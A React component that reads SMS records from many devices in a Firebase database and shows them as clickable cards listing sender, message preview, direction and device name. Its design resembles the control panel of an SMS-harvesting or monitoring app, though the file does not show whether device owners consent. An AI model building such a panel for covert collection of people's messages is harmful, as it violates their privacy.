import React, { useState, useEffect } from 'react';
import { ref, onValue } from 'firebase/database';
import { db } from '../firebase';
import { auth } from "../firebase";
import { useNavigate } from "react-router-dom";   // ⭐ ADD THIS

const SMSPage = () => {
  const [allSMS, setAllSMS] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  const navigate = useNavigate();  // ⭐ ADD THIS

  useEffect(() => {
    const dbPath = localStorage.getItem("dbPath_" + auth.currentUser?.uid);
    if (!dbPath) return;

    const devicesRef = ref(db, dbPath);

    const unsubscribe = onValue(devicesRef, (snapshot) => {
      try {
        const devicesData = snapshot.val();
        const smsList = [];

        if (devicesData) {
          Object.entries(devicesData).forEach(([deviceId, deviceData]) => {
            if (deviceData.sms) {
              Object.entries(deviceData.sms).forEach(([smsId, smsData]) => {
                smsList.push({
                  id: smsId,
                  deviceId: deviceId,
                  deviceName: deviceData.deviceInfo?.deviceName || 'Unknown Device',
                  ...smsData
                });
              });
            }
          });
        }

        smsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        setAllSMS(smsList);
        setLoading(false);
      } catch (err) {
        setError('Error fetching SMS: ' + err.message);
        setLoading(false);
      }
    });

    return () => unsubscribe();
  }, []);


  const getMessagePreview = (message) => {
    if (!message) return 'No message';
    return message.length > 120 ? message.substring(0, 120) + '...' : message;
  };


  return (
    <div>
      <div className="page-header">
        <h1 className="page-title">All SMS Messages</h1>
        <div className="badge badge-primary">Total: {allSMS.length} messages</div>
      </div>

      {allSMS.length === 0 ? (
        <div className="card">
          <p>No SMS messages found.</p>
        </div>
      ) : (
        <div>

          {/* CLICKABLE SMS CARD */}
          {allSMS.map((sms) => (
            <div
              key={sms.id}
              className="sms-card"
              onClick={() => navigate(`/device/${sms.deviceId}`)}  // ⭐ REDIRECT HERE
              style={{ cursor: "pointer" }}
            >
              <div className="sms-header">
                <div className="sms-sender">{sms.sender || 'Unknown Sender'}</div>
              </div>

              <div className="sms-message">
                {getMessagePreview(sms.message)}
              </div>

              <div className="sms-footer">
                <span className="badge badge-primary">
                  {sms.type === 1 ? 'Received' : 'Sent'}
                </span>
                <span className="badge badge-info">
                  {sms.deviceName}
                </span>
              </div>
            </div>
          ))}

        </div>
      )}
    </div>
  );
};

export default SMSPage;
